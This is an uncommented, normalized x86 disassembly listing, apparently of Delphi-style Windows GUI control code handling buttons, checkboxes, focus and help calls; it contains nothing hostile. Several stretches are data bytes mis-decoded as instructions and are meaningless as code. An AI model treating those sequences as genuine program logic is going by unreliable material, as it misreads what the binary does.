mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_433268
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41dde0
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403394
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41dde0
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403394
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_4372fc
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_4333ac
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_433370
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43340c
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403394
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433434
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_439a40
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_433498
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433525
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43352c
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_43357c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ca50
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_4335a0
push ebx
mov ebx eax
mov eax ebx
call sub_446ab4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403348
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4335d8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43362e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_43363c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43ca84
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_433690
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441828
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_4336e4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_433708
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_43e76c
mov eax ebx
mov si 0xffb5
call sub_403394
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_440d58
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403394
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_433780
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f57c
mov ebx eax
mov eax ebx
call sub_42f65c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440d58
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f7f4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4337cc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_43f1ac
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_4337f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43dbe4
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_433830
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43363c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_439d2c
mov edx 0x19
mov eax esi
call sub_439d50
mov dl 0x1
mov eax esi
call sub_440f8c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4338bc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44105c
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_440d58
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_440d58
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_433910
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44105c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_451710
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_43b724
sub_433944
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4337f8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_43db10
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4339ac
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_4401d4
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_451618
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403394
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433a19
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433a92
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4401dc
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403394
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433a99
sub_433aa0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_4401e4
pop edi
pop esi
pop ebx
retn
sub_433af4
push ebx
push esi
mov esi edx
mov ebx eax
call sub_42f57c
call sub_42f65c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_433b20
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_42f57c
mov ebx eax
mov eax ebx
call sub_42f65c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440d58
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_42f7f4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_433b6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43363c
mov edx 0x61
mov eax esi
call sub_439d2c
mov edx 0x11
mov eax esi
call sub_439d50
mov dl 0x1
mov eax esi
call sub_440f8c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_433bd8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403394
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_433c04
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_433c8c
retn
mov dl 0x2
call sub_433c8c
jmp r-xdata
xor edx edx
call sub_433c8c
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_433c8c
jmp r-xdata
sub_433c8c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44105c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_440d58
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403394
sub_433ce0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4337f8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43db10
mov eax ebx
mov si 0xffc8
call sub_403394
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_433d3b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6035173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_440d58
push eax
call SendMessageA
pop ebx
retn
sub_433d84
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_433e12
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4401dc
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403394
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433e19
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_433e30
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43363c
mov edx 0x71
mov eax esi
call sub_439d2c
mov edx 0x11
mov eax esi
call sub_439d50
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_433e98
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403394
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_433ed8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_43da4c
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_446d48
sub_433f94
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440f8c
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_440d58
push eax
call SendMessageA
push ebp
call sub_433ed8
pop ecx
mov eax [ ebp - 0x4 ]
call sub_43a17c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403394
sub_434020
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_4337f8
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_43db10
mov eax ebx
mov si 0xffc8
call sub_403394
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_434077
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6371173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_440d58
push eax
call SendMessageA
pop ebx
retn
sub_4340ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434121
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a570
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4516a0
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4401dc
mov eax ebx
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434128
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_434130
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403394
jmp r-xdata
pop esi
retn
sub_434160
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_434185
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43418c
retn
sub_43428c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_446b98
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4342c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4342ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4342f4
retn
sub_43439a
inc ebx
add [ ebx - 0x72ffbcbd ] al
inc ebx
inc ebx
add [ ecx ] dh
inc ebx
inc ebx
add [ ecx ] bh
inc ebx
inc ebx
add [ ecx + 0x43 ] al
inc ebx
add [ ecx + 0x43 ] cl
inc ebx
add [ ecx + 0x43 ] dl
inc ebx
add [ ecx + 0x43 ] bl
add [ ebx + 0x43 ] 0x0
lea eax [ ebx + 0x43 ]
cmp bl [ eax + 0x20004343 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc ebx
add [ ecx + 0x43 ] ah
inc ebx
add [ ecx + 0x43 ] ch
inc ebx
add [ ecx + 0x43 ] dh
inc ebx
add [ ecx ] dl
inc ebx
inc ebx
add [ ecx ] bl
inc ebx
inc ebx
add [ ecx ] ah
inc ebx
inc ebx
add [ ecx ] ch
inc ebx
inc ebx
pop ecx
inc ebx
cmp bl [ eax + 0x20004343 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ecx ] cl
inc ebx
inc ebx
add [ ebx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
sub [ ebx + 0x43 ] eax
cmp bl [ eax + 0x20004343 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23ffbcbc ] al
inc ebx
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax + 0x4344 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x24004344 ] bl
add [ eax ] al
add [ ecx + edx + 0x33e00040 ] ah
inc eax
add [ esi + edx * 2 + 0x56c00040 ] dh
inc eax
add ah dh
xor eax [ eax ]
call 0xffffffffd04384a8
push esi
inc eax
add [ ecx + esi + 0x40 ] cl
add [ eax ] ah
dec edi
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ah
add [ eax ] al
mov ah 0x4f
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434561
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403ee8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f80
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434568
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404268
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4344ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434561
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403ee8
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f80
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434568
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404268
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_43457c
push ebx
mov ebx eax
mov eax ebx
call sub_4348ac
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405634
sub_4345b8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43461f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_4344ac
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434626
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_434630
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4346b8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_4345a4
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404268
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4346bf
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
sub_4346cb
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_434753
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_434df0
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43475a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f0c
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4344ac
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043a8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4346d8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_434753
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_434df0
test al al
je r-xdata
